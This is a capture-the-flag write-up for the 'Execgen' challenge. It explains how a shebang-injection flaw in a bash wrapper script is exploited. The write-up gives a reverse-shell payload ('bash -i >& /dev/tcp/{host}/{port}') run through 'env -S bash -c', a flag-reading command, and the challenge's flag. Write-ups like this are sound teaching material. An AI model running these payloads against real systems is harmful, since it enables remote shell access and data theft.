# Execgen writeup

Some technical details may be incorrect in this article.

## Task

Gave a script and try to escalate it. The flag file is at the same directory of the script.

```bash
#!/bin/bash
IFS=''

banner='
___________                      ________
\_   _____/__  ___ ____   ____  /  _____/  ____   ____
 |    __)_\  \/  // __ \_/ ___\/   \  ____/ __ \ /    \
 |        \>    <\  ___/\  \___\    \_\  \  ___/|   |  \
/_______  /__/\_ \\___  >\___  >\______  /\___  >___|  /
        \/      \/    \/     \/        \/     \/     \/
Create your script: '

echo -n $banner

# create the script, easy!
read -r script

# oh, don't forget to add watermark!
script+='(created by execgen)'

# run the script for you, sweet!
tmp=$(mktemp)
echo "#!$script" > "$tmp"
chmod 0755 "$tmp"
out=$("$tmp")
echo "$out"
rm "$tmp"
```

## Writeup

You can skip the trying part if you're in a hurry.

### Trying

This script will concat shebang at the front and '(created by execgen)' at the end of input. And it'll execute it and print the "output of the program". Note that the `-r` option passed to read command prevents backslash escapes from being interpreted. So we can execute something in "a line", and that's pretty different than the normal script.

And one more thing I found after contest is `IFS=''`, it's also a defense, maybe I'll explain below?

OK so let's try bash?

I modified script a little bit (print the script) when I'm testing in the sake of convenience.

```
___________                      ________
\_   _____/__  ___ ____   ____  /  _____/  ____   ____
 |    __)_\  \/  // __ \_/ ___\/   \  ____/ __ \ /    \
 |        \>    <\  ___/\  \___\    \_\  \  ___/|   |  \
/_______  /__/\_ \\___  >\___  >\______  /\___  >___|  /
        \/      \/    \/     \/        \/     \/     \/
Create your script: /bin/bash 
The script would be
/bin/bash (created by execgen)
The output would be


```

Hmm, no output? That's weird.(Of course, I have no exception about the output of bash(?)) What about cat?

```
___________                      ________
\_   _____/__  ___ ____   ____  /  _____/  ____   ____
 |    __)_\  \/  // __ \_/ ___\/   \  ____/ __ \ /    \
 |        \>    <\  ___/\  \___\    \_\  \  ___/|   |  \
/_______  /__/\_ \\___  >\___  >\______  /\___  >___|  /
        \/      \/    \/     \/        \/     \/     \/
Create your script: /bin/cat 
The script would be
/bin/cat (created by execgen)
The output would be
#!/bin/cat (created by execgen)

```

Err... It seems it's strange.

UPD: I canceled `exec 2>/dev/null` in run.sh so that the error message is shown below

```
___________                      ________
\_   _____/__  ___ ____   ____  /  _____/  ____   ____
 |    __)_\  \/  // __ \_/ ___\/   \  ____/ __ \ /    \
 |        \>    <\  ___/\  \___\    \_\  \  ___/|   |  \
/_______  /__/\_ \\___  >\___  >\______  /\___  >___|  /
        \/      \/    \/     \/        \/     \/     \/
Create your script: /bin/cat 
The script would be
/bin/cat (created by execgen)
The output would be
/bin/cat: '(created by execgen)': No such file or directory
#!/bin/cat (created by execgen)


```

And I tested in locally:

```
$ cat (ddd fdfasdf)       
zsh: number expected

```

It seems that if we bracket it, it would be something like environment variable.


### Exploit

I cannot make use of the output in the shell now, so let's move backward: "... And it'll **execute** it and print the "output of the program".:

So actually we can exploit it without regard to the output! Why? Reverse Shell!!!

Then I found this [interesting article](https://stackoverflow.com/a/52979955): You can execute any command normally at the same line with shebang with `#!/usr/bin/env -S command arg1 arg2 ...`.

The rest is easy: find a reverse shell on [this website](https://www.revshells.com/) and connect back to your server.

And what about the details of payload? We have some garbage arguments at the end of our command.

Shout out to [John Hammond](https://www.youtube.com/@_JohnHammond), this trick is inspired from [his video](https://youtu.be/mEGnhfOX-xs?t=797)

```
-c        If the -c option is present, then commands are read from the first non-option argument command_string.  If there are arguments after the
         command_string, the first argument is assigned to $0 and any remaining arguments are assigned to the positional parameters.  The assignment to $0 sets the name of the shell, which is used in warning and error messages.
-i        If the -i option is present, the shell is interactive.

```

So we can use `-c` option to run the first argument captured, reverse shell get! You can learn about reverse shell and IFS variable in bash in the above video.

## POC

### Payload

Please modify the contents in the curly brackets.

`usr/bin/env -S bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1' {space_character}`

### Flag

`FLAG{t0o0oo_m4ny_w4ys_t0_g37_fl4g}`

## Other solution

### bash + cat

Using bash + cat is also a solution

```
$ nc edu-ctf.zoolab.org 10123

___________                      ________
\_   _____/__  ___ ____   ____  /  _____/  ____   ____
 |    __)_\  \/  // __ \_/ ___\/   \  ____/ __ \ /    \
 |        \>    <\  ___/\  \___\    \_\  \  ___/|   |  \
/_______  /__/\_ \\___  >\___  >\______  /\___  >___|  /
        \/      \/    \/     \/        \/     \/     \/
Create your script: usr/bin/env -S bash -c 'cat /home/chal/flag' 
FLAG{t0o0oo_m4ny_w4ys_t0_g37_fl4g}
```

## /bin/script

From [this writeup](https://hackmd.io/@dalun/rkmKeDd5s#Execgen), and actually this is also the solution of execgen-safe.

Execgen-safe is the problem similar to this problem but the input only allows English characters, numbers, slashes and spaces. You can try this harden version yourself.
 